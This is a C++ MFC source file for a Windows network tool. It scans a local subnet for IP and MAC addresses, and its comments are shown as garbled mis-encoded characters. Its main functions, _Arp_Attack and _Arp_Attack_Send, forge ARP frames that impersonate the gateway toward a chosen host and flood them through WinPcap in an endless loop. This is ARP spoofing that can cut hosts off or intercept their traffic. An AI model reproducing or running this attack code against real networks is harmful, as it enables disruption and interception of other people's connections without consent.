#include "stdafx.h"
#include <Iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib") //��Ҫ���Iphlpapi.lib��
/* ȫ�� �� �� */


bool _Now_Scan = false;   //����ɨ�� ????

char _Mac_MySelf [200]={0};  //��������������MAC��ַ
char _IP_MySelf  [200]={0};  //��������������IP ��ַ
char _IP_GW      [200]={0};  //���ص�        IP ��ַ

 


/*��������:�����ֽ�תΪ���ֽ�                                                              */
/*����1:���ֽ�ָ��                                                                         */
/*����2:���ֽڻ�����ָ��                                                                   */
/*����ֵ:����������гɹ�������cchWideChar��Ϊ��                                           */
int _AtoW(char *a,TCHAR* w)
{
	size_t size = 0;
	if(!a) return 0;
	int len = lstrlenA(a) *  sizeof(char);

	/*���ػ�������Ҫ�Ĵ�С*/
	if(!w)  
	{
	 size =  MultiByteToWideChar(CP_ACP,0,a,len,NULL,0);
	return size;
	}
	/*���ػ�������Ҫ�Ĵ�С*/
	else
		return  MultiByteToWideChar(CP_ACP,0,a,len,w,lstrlenA(a) * sizeof(TCHAR));



}

/*��������:�����ֽ�תΪ���ֽ�                                                              */
/*����1:���ֽ�ָ��                                                                         */
/*����2:���ֽڻ�����ָ��                                                                   */
/*����ֵ:����������гɹ�������cchWideChar��Ϊ��                                           */
int _WtoA(char *a,TCHAR* w)
{	
	size_t size = 0;
	if(!w) return 0;

	/* �õ�����*/
	int len = lstrlenW(w) *  sizeof(TCHAR);

	/*���ػ�������Ҫ�Ĵ�С*/
	if(!a)  
	{
		/*������Ҫ�Ŀռ��С*/
	 size =  WideCharToMultiByte(CP_ACP,0,w,-1,NULL,NULL,NULL,NULL);
	 return size;
	}
	   /*ת��*/

	else
	

		return  WideCharToMultiByte(CP_ACP, 0, w, -1, a, len, NULL, NULL);    

}




#define First  _T("IP��ַ")
#define Second _T("MAC��ַ")
#define Third  _T("ARP��ƭ")
#define Four   _T("HANDLE")
#define With 150



//=================================================================================================================================================
/* ���� */
CListCtrl * _cListCtrl = NULL;
/* ��������:��ʼ���б��    */
/* ����1: �б��ָ��        */
/* ����ֵ:�ɹ�����0  �����0*/
int _InitListCtrl(CListCtrl *cListCtrl)
{
	if(!cListCtrl) return 1;
	else
		cListCtrl->InsertColumn(0,Four,0,With,0);
	    cListCtrl->InsertColumn(0,Third,0,With,0);
	    cListCtrl->InsertColumn(0,Second,0,With,0);
		cListCtrl->InsertColumn(0,First,0,With,0);
		
		_cListCtrl = cListCtrl;
	return 0;
}


/* ��������:��ӵ��б��    */
/* ����1: ip        */
/* ����2: mac        */
/* ����ֵ:�ɹ�����0  �����0*/
int _List_Add(CListCtrl *cListCtrl,TCHAR *iP,TCHAR *Mac)
{
	if(!cListCtrl) return 1;

	int i = 0;
	i = cListCtrl->InsertItem(0,iP,0);

	
	return cListCtrl->SetItem(i,1,1,Mac,0,0,0,0,0);

}

int _ListSetHandle(CListCtrl *cListCtrl, int handle,int n)
{   if(!cListCtrl) return 1; 
    TCHAR i[20]={0};
    _itow_s(handle,i,10);
	return cListCtrl->SetItem(n,3,1,i,0,0,0,0,0);
}


int _ListSetMac  (CListCtrl*cListCtrl,TCHAR *Mac,int n)
{   if(!cListCtrl) return 1;
	return cListCtrl->SetItem(n,1,1,Mac,0,0,0,0,0);
}
/* ��������:��ȡIP    */
/* ����1: ip������        */
/* ����2: ����        */
/* ����ֵ:�ɹ�����0  �����0*/
int _List_GetiP  (CListCtrl *cListCtrl,TCHAR*iP,int inDex)
{
	if(!cListCtrl || !iP) return 1;

	/* ����ռ�      */
	TCHAR *__Tchar = new TCHAR[255];



	/* ��ʼ��!��ϰ�� */
	memset(__Tchar,0,255);



	/* ��ȡ          */
	cListCtrl->GetItemText(inDex,0,__Tchar,255);

	/* Debug         */
	//MessageBox(NULL,__Tchar,NULL,MB_OK);



	/* Copy          */
	int __len = lstrlenW(__Tchar) * sizeof(TCHAR);
	memcpy(iP,__Tchar,__len);


	/*Delete Pointer  */
	delete __Tchar;

}


/* ��������:��ȡIP    */
/* ����1: ip������        */
/* ����2: ����        */
/* ����ֵ:�ɹ�����0  �����0*/
int _List_GetMac  (CListCtrl *cListCtrl,TCHAR*Mac,int inDex)
{
	if(!cListCtrl || !Mac) return 1;
	/* ����ռ�      */
	TCHAR *__Tchar = new TCHAR[255];
	/* ��ʼ��!��ϰ�� */
	memset(__Tchar,0,255);
	/* ��ȡ          */
	cListCtrl->GetItemText(inDex,1,__Tchar,255);
	/* Debug         */
	//MessageBox(NULL,__Tchar,NULL,MB_OK);
	/* Copy          */
	int __len = lstrlenW(__Tchar) * sizeof(TCHAR);
	memcpy(Mac,__Tchar,__len);
	/*Delete Pointer  */
	delete __Tchar;

}
int _List_GetHanlde  (CListCtrl *cListCtrl,TCHAR*Mac,int inDex)
{
	if(!cListCtrl || !Mac) return 1;
	/* ����ռ�      */
	TCHAR *__Tchar = new TCHAR[255];
	/* ��ʼ��!��ϰ�� */
	memset(__Tchar,0,255);
	/* ��ȡ          */
	cListCtrl->GetItemText(inDex,3,__Tchar,255);
	/* Debug         */
	//MessageBox(NULL,__Tchar,NULL,MB_OK);
	/* Copy          */
	int __len = lstrlenW(__Tchar) * sizeof(TCHAR);
	memcpy(Mac,__Tchar,__len);
	/*Delete Pointer  */
	delete __Tchar;

}
//==================================================================================================================================================






//==================================================================================================================================================
/* ��������:�Ƿ�Ϊ�ϸ��IP         */
/* ����1:����GUIDָ��              */  //Ϊ�˷����������char��
/* ����1:IP      ָ��              */  //Ϊ�˷����������char��
/* ����1:����    ָ��              */  //Ϊ�˷����������char��
/* ����ֵ:�ϸ�true   ���ϸ�false   */
bool _iP_iSok (TCHAR *iP)
{
	unsigned int __len = lstrlenW(iP);
	if(__len <=7 ||  __len >15)             return false;
	else                                     return true;
}
bool _iP_GetiP(char *Guid,char *iP,char *Gw)
{
	if(!Guid || !iP || !Gw) return false;

	//PIP_ADAPTER_INFO�ṹ��ָ��洢����������Ϣ
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();




	 //====================================================================================
	/* ����һ�� ��{ǰ���ȥ�� */
	TCHAR *__szGuid = NULL;
	USHORT __size = _AtoW(Guid,NULL);
	__szGuid = new TCHAR[__size];
	memset(__szGuid,0,__size);
	_AtoW(Guid,__szGuid);
	__szGuid[__size]=0;
	/* �ŵ�CString�ô���- -   */
	CString __csGuid;
	__csGuid.SetString(__szGuid);
	/* �ŵ�CString�ô���- -   */
	USHORT __poin = __csGuid.Find(TEXT("{"));
	CString __Guid = __csGuid.Right(__csGuid.GetLength()-__poin);
	//====================================================================================
	if(__Guid.GetString()[0]==0) return 0;




	//�õ��ṹ���С,����GetAdaptersInfo����
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);



	//����GetAdaptersInfo����,���pIpAdapterInfoָ�����;����stSize��������һ��������Ҳ��һ�������
    int nRel = GetAdaptersInfo(pIpAdapterInfo,&stSize);

	//��¼��������
    int netCardNum = 0;

	if (ERROR_BUFFER_OVERFLOW == nRel)
    {
        //����������ص���ERROR_BUFFER_OVERFLOW
        //��˵��GetAdaptersInfo�������ݵ��ڴ�ռ䲻��,ͬʱ�䴫��stSize,��ʾ��Ҫ�Ŀռ��С
        //��Ҳ��˵��ΪʲôstSize����һ��������Ҳ��һ�������
        //�ͷ�ԭ�����ڴ�ռ�
        delete pIpAdapterInfo;
        //���������ڴ�ռ������洢����������Ϣ
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        //�ٴε���GetAdaptersInfo����,���pIpAdapterInfoָ�����
        nRel=GetAdaptersInfo(pIpAdapterInfo,&stSize);    
    }
	/* ����!!�ҵ�Ҫ��GUID Ȼ�󷵻�  */


	for (PIP_ADAPTER_INFO i = pIpAdapterInfo; i!=NULL; i=i->Next)
	{
		/* ����������ֻ����Ҫ���غ� IP��ַ */
		/* 16 bytes of char*/
		/*

		typedef struct {
        char String[4 * 4];
        } IP_ADDRESS_STRING, *PIP_ADDRESS_STRING, IP_MASK_STRING, *PIP_MASK_STRING;
        */

		/* �Ƚ��ǲ�������Ҫ��*/
	
		// �� ! ��ת!!


		//============ת������==========
		size_t __dwSize = _AtoW(i->AdapterName,NULL);
		TCHAR *__szThar = new TCHAR [__dwSize + 1];
		memset(__szThar,0,sizeof(__dwSize));
		_AtoW(i->AdapterName,__szThar);
		__szThar[__dwSize] = 0;
		//MessageBox(NULL,__szThar,NULL,MB_OK);
		//============ת������========== ->__szThar

		if(NULL == lstrcmp(__szThar,__Guid.GetString()))
		{
			   //�ҵ�������
			lstrcpyA(iP,(char*)&i->IpAddressList.IpAddress);
			lstrcpyA(Gw,(char*)&i->GatewayList.IpAddress);
				goto del;
		}
		
		

		/* delete */
		delete []__szThar;
	}
	
del:delete pIpAdapterInfo;
	return true;
}
//==================================================================================================================================================




//==================================================================================================================================================
/* ��������:*/ 
/* ����1:*/ 
/* ����2:*/
CEdit *_cEdit=NULL;
bool _Edit_Add_W(CEdit* edit,TCHAR *text)
{
	size_t len = 0;
	if(!edit) return false;
	else
    len  = edit->GetWindowTextLengthW()  *  sizeof(TCHAR)  +  lstrlenW(text) * sizeof(TCHAR) + 1;

	TCHAR *__szPoint = new TCHAR[len];
	memset(__szPoint,0,len);

	edit->GetWindowTextW(__szPoint,len);

	lstrcatW(__szPoint,text);

	edit->SetWindowTextW(__szPoint);

	_cEdit = edit;
	delete []__szPoint;
	return true;
}
bool _Edit_Add_A(CEdit* edit,char *text)
{
		 size_t len = 0;
	     if(!edit) return false;
	     else
			 len  = 	 ::GetWindowTextLengthA(edit->m_hWnd)   +   lstrlenA(text) + 1;
		 if(!len)  return false;

		 char *_szPoint = new char [len];
		 memset(_szPoint,0,len);

		 GetWindowTextA(edit->m_hWnd,_szPoint,len);
		 lstrcatA(_szPoint,text);
		 SetWindowTextA(edit->m_hWnd,_szPoint);
		 	_cEdit = edit;
	       delete []_szPoint;
	      return true;

}
//==================================================================================================================================================











//==================================================================================================================================================
/* ��������:*/ 
/* ����1:*/ 
/* ����2:*/
CButton *_Button_1,*_Button_2,*_Button_3,*_Button_4,*_Button_5;
int _InitButton(CButton *B1,CButton *B2,CButton *B3,CButton *B4,CButton *B5)
{
	_Button_1 = B1;
	_Button_2 = B2;
	_Button_3 = B3;
	_Button_4 = B4;
	_Button_5 = B5;
	return 1;
}
int _Button_Disable(CButton *B1,bool able)
{
	if(!B1) return 0;
	B1->EnableWindow(able);
	return 1;
}
//==================================================================================================================================================




//==================================================================================================================================================
//   ARP��ͷ
#pragma pack(1)
typedef struct arphdr //arpͷ�ṹ
{
unsigned short arp_hdr;    //ARP���� OR ARP�ظ�
unsigned short arp_pro;    //Ӳ������
unsigned char  arp_hln;    //������- -
unsigned char  arp_pln;    //������- - 
unsigned short arp_opt;    //������- - 
unsigned char  arp_sha[6]; //Դ  MAC
unsigned long  arp_spa;    //Դ  IP
unsigned char  arp_tha[6]; //Ŀ��MAC
unsigned long  arp_tpa;    //Ŀ��IP
}ARPHDR,*PARPHDR;


//   ��̫ͷ
typedef struct ethdr 
{
unsigned char  eh_src[6];  //Դ   MAC
unsigned char  eh_dst[6];  //Ŀ�� MAC
unsigned short eh_type;    //Э������ - -ARP = = 0x0806
}ETHDR,*PETHDR;

bool _Other_GetMacByIp(TCHAR *IP,TCHAR *MAC)
{
	if(!IP || !MAC) return false;
		 /* SendARP */
	 ULONG  Len = 6;
	 wchar_t *WStr;
	 char __mac[20]={0},__mac_[20]={0};
	 TCHAR *__MAC = NULL;

	 /**/
	 size_t _size = _WtoA(NULL,IP);
	 char *_IP = new char[_size + 1] ;
	 memset(_IP,0,_size);
	 _WtoA(_IP,IP);
	 _IP[_size] = NULL;

	 /*Debug*/

	 IPAddr _MAC[3]= {0};
	 ULONG  _LEN = 6;
	 if(NO_ERROR==SendARP(inet_addr(_IP),NULL,_MAC,&_LEN))
	 {
		 //
		  BYTE  *__p = (PBYTE)&_MAC;
		for ( BYTE  i = 0; i <6; i++)
	   {

		            Sleep(100);
		            wsprintfA(__mac,"%.2X",*(__p+i));
		         	lstrcatA(__mac_,__mac);
	   }
		/*��Ҫת��UNICODE*/
		size_t __size =  _AtoW(__mac_,NULL);
		TCHAR *_TMAC = new TCHAR[__size + 1];
		memset(_TMAC,0,__size);
		_AtoW(__mac_,_TMAC);
		_TMAC[__size] = 0;
		lstrcpyW(MAC,_TMAC);
		delete []_TMAC;


	 }
}


/* ���� */
pcap_t *adhandle = NULL;

	char _szBuffer[250] = {0};//�������ݰ�


/* ��������:���޷���*/
/* ����1:���͵�����*/
bool _Arp__Attack()
{
	return true;

}


/* ��������:ת��MAC */
bool _Arp_ToMac(char *In_Mac,unsigned char *Out_Mac)
{
	int i_i = 0;
	char temp[20]={0};
	USHORT Q_Q = 0;
	int q=0;
	int value = 0;
	int QYG = 0;
	int HYG = 0;
	int var = 0;
	unsigned char src[8] = {0};
	for (int i = 0; i < 12; i++)
	{
       lstrcpynA((LPSTR)&temp,In_Mac+i,2);
	   
	   if(temp[0] >= 65 && temp[0] <=90)
	   {
		    i_i = (int)temp[0]  - 55;
			
	   }
	   else i_i = atoi(temp);
	   if(0==i%2)
	   {
		   QYG = i_i;
	   }
	   else HYG=i_i;
	   q++;
	   if(q==2)
	   {
		   value = QYG * 16 + HYG;

		   memcpy(Out_Mac + var,&value,2);
		 
		   q = 0;
		   var++;
	   }

	   

	}
	return true;
}

/* �������� �̹߳���*/
bool _Arp_Attack_Send()
{
	//if(szBuffer) return false;
	unsigned char sz_Buffer[250] = {0};
	memcpy(sz_Buffer,_szBuffer,42);
	while (true)
	{
		pcap_sendpacket(adhandle,(unsigned char*)sz_Buffer,42);

		Sleep(10);
	}
}

/* ��������:������ݰ������̷߳���*/
/* ����1:MAC*/
/* ����2:IP*/
bool _Arp_Attack(TCHAR *Mac,TCHAR *IP,char *GUID,int index)
{
	
	/* ���� ��̫��ͷ */
	/*==*/ ETHDR  _ETHDR  = {0};
	   
	/*==*/_ETHDR.eh_type =  htons(0x0806);
	/*==*//*ȡ������MAC    */
	/*==*/TCHAR __MAC[200]={0};
	/*==*//* ��̫��ͷ ֱ�����ȥ�Ϳ�����*/
	/*==*///CopyMemory(_ETHDR.eh_src,(void*)_Mac_MySelf,6);   //Դ  MAC

	      //ת��CHAR  MAC
	/*==*/       size_t _size = _WtoA(NULL,Mac);
	/*==*/	     char *_sz = new char[_size+1];
	/*==*/	     memset(_sz,0,_size);
	/*==*/	    _WtoA(_sz,Mac);
	
	//MessageBoxA(NULL,NULL,NULL,MB_OK);

	/*==*/  //     CopyMemory(_ETHDR.eh_dst,(void*)_sz,6);   //Ŀ��MAC

	//Դ  MAC   _Mac_MySelf
	//Ŀ��MAC   _sz


	//==============================================================================================================================
	//����ֱ��COPY��ȥ �����ַ�����- -
	unsigned char szMac[250]={0};
	/* ԴMAC*/
	_Arp_ToMac(_Mac_MySelf,szMac);
	memcpy(_ETHDR.eh_dst,szMac,6);
	/* Ŀ��MAC */
	_Arp_ToMac(_sz,szMac);
	memcpy(_ETHDR.eh_src,szMac,6);
	//==============================================================================================================================

   //ԴMAC��Ŀ��MAC����λ����= 







	//==============================================================================================================================
	/* ���� ARP��ͷ*/
	ARPHDR _ARPHDR = {0};
	
	_ARPHDR.arp_hdr = htons(001);
	_ARPHDR.arp_pro=  htons(0x800);
	_ARPHDR.arp_hln=6;
    _ARPHDR.arp_pln=4;
    _ARPHDR.arp_opt=htons(1);
	//_ARPHDR.arp_tpa=inet_addr(IP);
	 //ת��CHAR IP
	/*==*/        _size = _WtoA(NULL,IP);
	/*==*/	     char *_sz_ip = new char[_size+1];
	/*==*/	     memset(_sz_ip,0,_size);
	/*==*/	    _WtoA(_sz_ip,IP);
	_ARPHDR.arp_spa=inet_addr(_IP_GW);            //����������IP��ַ

	_ARPHDR.arp_tpa=inet_addr(_sz_ip);            //������Ҫ��ƭ��IP��ַ
  //_ARPHDR.arp_sha = {0};                        //ԴMAC �����
	for (int i = 0; i < 6; i++)
		_ARPHDR.arp_sha[i] = 0xFF; 

	

	//_ARPHDR.arp_tha ;                          //COPY��̫��ͷ�ľ�����
	memcpy(_ARPHDR.arp_tha,_ETHDR.eh_dst,6);     //Ŀ��MAC
	 //==============================================================================================================================



	/* �������ݰ�  */
//char _szBuffer[250] = {0};
	memcpy(_szBuffer,&_ETHDR,sizeof(ETHDR));
	memcpy(_szBuffer + sizeof(ETHDR),&_ARPHDR,sizeof(ARPHDR));
	/* �������ݰ� */
    // ���Ҫ���͵����ݾ��� _szBuffer[]

	

	char Errbuf[200]={0};
	if(!GUID) goto del;
	adhandle = pcap_open_live(GUID,65536,1,1000,Errbuf);  //��������������Ϊ [����ģʽ]
	if(!adhandle) {MessageBoxA(NULL,Errbuf,NULL,MB_OK); goto del;}

	/* �����߳�  ���߳�ȥ ���� */
	//while (true)

	pcap_sendpacket(adhandle,(unsigned char *)&_szBuffer,42);

	

	//memcpy(p,_szBuffer,sizeof(ETHDR) + sizeof(ARPHDR));
	
	/**/ // ��һ��DEBUG
	//��̫ ��ͷ�� Ŀ��MAC����

	//ARPͷ�� ܫMAC����


	/**/

	HANDLE Th = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)_Arp_Attack_Send,NULL,NULL,NULL);

	_ListSetHandle(_cListCtrl,(int)Th,index);



del:delete []_sz; delete []_sz_ip;
	//==============================================================================================================================
	return true;
	
}
//==================================================================================================================================================







//==================================================================================================================================================
HANDLE _Arp_Event = 0;
char   _Arp_sziP[100]={0};
USHORT _Arp_Thrd = 0;

/* ��������:ɨ��*/
/* ����1:*/
/* ����2:*/
void   _Arp_Watch     (int __i)
{
	_Arp_Thrd = 0;
	while (true)
	{
		Sleep(1);
		char szBuf[10]={0};
		_itoa_s(_Arp_Thrd,szBuf,10);
		//�������� �и��ָ�õ�˵��- -
		if(__i == _Arp_Thrd || (_Arp_Thrd == __i-1) || (_Arp_Thrd == __i-2)|| (_Arp_Thrd == __i-3))
		{
			_Edit_Add_A(_cEdit,"�����߳��Ѿ�����\r\n");
			_Button_Disable(_Button_1,true);
			_Now_Scan = false;
			break;
		}
	}
}

/* ��������:ɨ��*/
/* ����1:*/
/* ����2:*/
void   _Arp_Scan      (int  _i)
{
	 
	 char __sz[200] = {0};
	 char __sp[100] = {0};
	 char __s[10]={0};
	 lstrcpyA(__sp,_Arp_sziP);
	 _itoa_s(_i,__s,10);
	 lstrcatA(__sp,__s);


	 /* SendARP */
	 IPAddr Mac[3]={0};
	 ULONG  Len = 6;
	 wchar_t *WStr;
	 char __mac[20]={0},__mac_[20]={0};
	 TCHAR *__MAC = NULL;
	 Sleep(100);
	 if(NO_ERROR == SendARP(inet_addr(__sp),NULL,Mac,&Len))
	 {
		 /* ����������  */
	    size_t len = strlen(__sp) + 1;
        size_t converted = 0;
 
       WStr=(wchar_t*)malloc(len*sizeof(wchar_t));
	
       mbstowcs_s(&converted, WStr, len, __sp, _TRUNCATE);

	   /* ���� MAC*/
	   BYTE  *__p = (PBYTE)&Mac;

	   for ( BYTE  i = 0; i <6; i++)
	   {

		       
		            wsprintfA(__mac,"%.2X",*(__p+i));
		         	lstrcatA(__mac_,__mac);
	   }
		 
	   /* תΪUNICODE */
	   size_t size =  _AtoW(__mac_,NULL);
	   __MAC = new TCHAR[size + 1];
	   memset(__MAC,0,size);
	   _AtoW(__mac_,__MAC);
	   __MAC[size] = 0;
	   lstrcatA(__mac,__mac_);
	   //MessageBoxA(NULL,__mac_,NULL,MB_OK);
	  OutputDebugStringW(__MAC);
	  OutputDebugStringW(TEXT("\n"));
	    //  Sleep(2000);
	   //_List_Add(_cListCtrl,WStr,__MAC);

	 //_ListSetMac(_cListCtrl,__MAC,_i);
	   //ReleaseMutex(_Arp_Event);
	 }
	
	  
	//  WaitForSingleObject(_Arp_Event,3000); 
	 /* _Edit_Add_A(_cEdit,__s);
	  _Edit_Add_A(_cEdit,"���߳�ִ�����!");
	  _Edit_Add_A(_cEdit,"\r\n");*/


	  /* - - */
	 WaitForSingleObject(_Arp_Event,1000); 
	 if(__MAC)
	 {
	 _List_Add(_cListCtrl,WStr,__MAC);
	 
	 }
	  ++_Arp_Thrd; 
	 ReleaseMutex(_Arp_Event);

	


}

/* ��������:ʹ��ARP��ɨ��*/ 
/* ����1:��ʼIP*/ 
/* ����2:IP��Ŀ*/
void _Arp_StartScan(char *startip,int start,int num)
{
	  size_t _i = 0;
	 _Arp_Event = ::CreateMutex(NULL,false,NULL);
	 if(!_Arp_Event) return ;

	 //�����
	  _i = lstrlenA(startip)+1;
	 while (_i--)
	 {
		 if(startip[_i]=='.')
		 {
			 lstrcpynA(_Arp_sziP,startip,_i+2); //Ϊʲô +2..........�Լ�����..
			 break;
		 }
	 }

	 for (int i = start; i <= num; i++)
	 {
		 //�����߳�...
		 ::CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&_Arp_Scan,(LPVOID)i,NULL,NULL);
	 }
	 /* ����һ������߳� */
	 ::CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&_Arp_Watch,(LPVOID)num,NULL,NULL);


	 //��� ����ɨ��
	 _Now_Scan = true;


}


bool   _Arp_Scaning   (){return _Now_Scan;}

//==================================================================================================================================================



bool _Set_Mac_MySelf(char *MAC)
{
	if(!MAC) return false;
	return lstrcpyA(_Mac_MySelf,MAC);
}
bool _Set_IP_MySelf(char *IP)
{
	if(!IP) return false;
	return lstrcpyA(_IP_MySelf,IP);
}

bool _Set_Gw_MySelf(char *gw)
{	if(!gw) return false;
	return lstrcpyA(_IP_GW,gw);
}